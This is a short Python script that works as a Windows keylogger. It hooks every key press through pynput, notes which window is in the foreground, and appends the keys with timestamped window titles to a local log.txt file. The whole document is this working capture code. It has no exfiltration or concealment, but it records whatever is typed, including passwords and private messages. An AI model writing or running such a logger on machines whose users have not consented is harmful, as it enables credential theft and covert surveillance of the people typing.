from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow
import datetime

LAST_WINDOW = None

def pressed_key(key):
    global LAST_WINDOW
    with open("log.txt", "a") as file:
        window = GetWindowText(GetForegroundWindow())  # Gets information about the opened window
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            file.write(f"\n #### {window} - {datetime.datetime.now()}\n")
        # Convert Numeric Keypad Number Keys
        try:
            if key.vk >= 96 and key.vk <= 105:
                key = key.vk - 96
        except:
            pass
        # Key need to be a str to be written on the log file, so let's transform it and remove the unnecessaries "'"
        key = str(key).replace("'", "")
        print(key)

        if len(key) > 1:  # Ex: Key.enter, Key.shift,....
            key = f" [{key}] "
        file.write(key)

with keyboard.Listener(on_press=pressed_key) as listener:
    listener.join()  # join() keeps execution alive until the thread terminates.

